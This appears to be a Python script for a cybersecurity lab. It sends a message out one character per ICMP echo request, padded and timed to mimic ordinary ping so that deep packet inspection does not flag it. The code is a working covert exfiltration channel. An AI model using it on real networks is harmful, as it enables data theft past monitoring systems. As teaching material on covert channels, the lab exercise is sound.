#!/usr/bin/env python3
"""
Stealth ICMP Data Transmission
Lab 1 - Cybersecurity
Activity 2: Stealth Mode

This program sends encrypted text through ICMP request packets (one character per packet)
to avoid detection by Deep Packet Inspection (DPI) systems.
The last character is transmitted as 'b' to mark the end of transmission.
"""

import socket
import struct
import time
import sys
import os


def checksum(source_string):
    """
    Calculate the ICMP checksum for the given data.
    
    Args:
        source_string (bytes): The data to calculate checksum for
        
    Returns:
        int: The calculated checksum
    """
    # Make sure we have an even number of bytes
    if len(source_string) % 2:
        source_string += b'\x00'
    
    # Sum all 16-bit words
    total = 0
    for i in range(0, len(source_string), 2):
        word = (source_string[i] << 8) + source_string[i + 1]
        total += word
        total = (total & 0xffff) + (total >> 16)
    
    # One's complement
    return ~total & 0xffff


def create_icmp_packet(data_char, packet_id, sequence):
    """
    Create an ICMP Echo Request packet with a single character in the data field.
    
    Args:
        data_char (str): The character to embed in the packet
        packet_id (int): The packet ID
        sequence (int): The sequence number
        
    Returns:
        bytes: The complete ICMP packet
    """
    # ICMP type (8 = Echo Request), code (0), checksum (0 for now), id, sequence
    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    
    # Convert character to bytes and pad to look like normal ping data
    # Normal ping sends 32 bytes of data by default
    data = data_char.encode('utf-8')
    # Pad with standard ping pattern (incrementing bytes starting from 0x08)
    padding = bytes([(i + 8) % 256 for i in range(31)])
    full_data = data + padding
    
    # Create ICMP header without checksum
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, packet_id, sequence)
    
    # Calculate checksum with header and data
    icmp_checksum = checksum(icmp_header + full_data)
    
    # Recreate header with correct checksum
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, packet_id, sequence)
    
    return icmp_header + full_data


def send_stealth_ping(target_host, encrypted_message):
    """
    Send the encrypted message via stealth ICMP packets.
    
    Args:
        target_host (str): Target hostname or IP address
        encrypted_message (str): The encrypted message to transmit
    """
    try:
        # Create raw socket (requires root privileges)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        # Get target IP
        target_ip = socket.gethostbyname(target_host)
        print(f"Sending stealth data to {target_host} ({target_ip})")
        print(f"Message to transmit: '{encrypted_message}'")
        print(f"Total packets to send: {len(encrypted_message) + 1}")  # +1 for end marker
        print("-" * 50)
        
        packet_id = os.getpid() & 0xFFFF  # Use process ID as packet ID (like real ping)
        
        # Send each character as a separate ICMP packet
        for i, char in enumerate(encrypted_message):
            sequence = i + 1
            packet = create_icmp_packet(char, packet_id, sequence)
            
            print(f"Packet {sequence}: Sending character '{char}' in ICMP data field")
            sock.sendto(packet, (target_ip, 0))
            time.sleep(1)  # 1 second delay between packets (like normal ping)
        
        # Send end marker 'b'
        final_sequence = len(encrypted_message) + 1
        end_packet = create_icmp_packet('b', packet_id, final_sequence)
        print(f"Packet {final_sequence}: Sending end marker 'b'")
        sock.sendto(end_packet, (target_ip, 0))
        
        sock.close()
        print("-" * 50)
        print("Stealth transmission completed successfully!")
        print("All packets sent with standard ping timing and formatting to avoid DPI detection.")
        
    except PermissionError:
        print("Error: This program requires root privileges to create raw sockets.")
        print("Please run with sudo: sudo python3 stealth_ping.py")
        sys.exit(1)
    except socket.gaierror:
        print(f"Error: Could not resolve hostname '{target_host}'")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


def demonstrate_normal_ping():
    """
    Show what a normal ping packet looks like for comparison.
    """
    print("=" * 60)
    print("NORMAL PING PACKET STRUCTURE (for comparison):")
    print("=" * 60)
    print("ICMP Header (8 bytes):")
    print("  Type: 8 (Echo Request)")
    print("  Code: 0")
    print("  Checksum: Calculated")
    print("  Identifier: Process ID")
    print("  Sequence Number: Incremental")
    print("\nICMP Data (32 bytes by default):")
    print("  Standard pattern: 0x08, 0x09, 0x0a, 0x0b, ... 0x27")
    print("\nOur stealth packets use the SAME structure but replace")
    print("the first byte of data with our character, keeping the")
    print("same timing (1s intervals) and packet size to avoid detection.")
    print("=" * 60)


def main():
    """Main function to handle command line arguments and execute stealth transmission."""
    if len(sys.argv) != 3:
        print("Usage: sudo python3 stealth_ping.py <target_host> <encrypted_message>")
        print("Example: sudo python3 stealth_ping.py localhost 'Khoor Zruog'")
        print("\nNote: This program requires root privileges to create raw sockets.")
        sys.exit(1)
    
    target_host = sys.argv[1]
    encrypted_message = sys.argv[2]
    
    demonstrate_normal_ping()
    send_stealth_ping(target_host, encrypted_message)


if __name__ == "__main__":
    main()